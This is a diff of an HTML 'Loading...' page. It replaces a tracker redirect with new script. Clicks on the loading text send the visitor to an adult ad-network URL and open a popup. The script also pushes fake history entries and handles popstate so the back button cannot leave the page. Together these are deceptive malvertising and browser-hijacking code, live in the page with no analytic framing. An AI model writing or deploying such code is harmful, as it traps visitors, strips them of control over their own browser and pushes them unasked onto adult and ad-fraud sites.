@@ -33,27 +33,35 @@
     }
   </style>
 
-  <script>
-    function GetQueryString(name) {
-      var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
-      var r = window.location.search.substr(1).match(reg);
-      if(r!=null)return decodeURI(r[2]); return null;
-    }
-  </script>
-  
-  <script>
-    const key = GetQueryString("key");
-    const c1 = GetQueryString("c1");
-    const c2 = GetQueryString("c2");
-    const redirectUrl = "http://ig2kv.bemobtrcks.com/go/" + key + "?c1=" + c1 + "&c2=" + c2;
-  </script>
+<script>
+            function launchpopLink() {
+                var redirectUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
+                var mainUrl = "https://126b080185fc.dreamy-path.net/?p=19348&media_type=adult&pi=luckdog&click_id={cid}";
+            
+                window.location.href = redirectUrl;
+                window.open(mainUrl, "_blank");
+            }
+        </script>
+            
+        <script>
+            function init() {
+            setTimeout(function(){window.scrollTo(0,1)},0);
+            }
+            window.history.replaceState('/loading', '', '/loading');
+            window.history.pushState('/loading', '', '/loading');
+            window.addEventListener('popstate', function(e) {
+            if(document.URL.indexOf('/loading') >= 0){
+            document.location.href = document.location;
+            }
+            });
+        </script>
   
 
   
        
 </head>
 <body>
-    <div><b>Loading...</b></div><br>
-    <div class="loading"></div>
+    <div  onclick='launchpopLink()'><b>Loading...</b></div><br>
+    <div class="loading" onclick='launchpopLink()'></div>
 </body>
 </html>
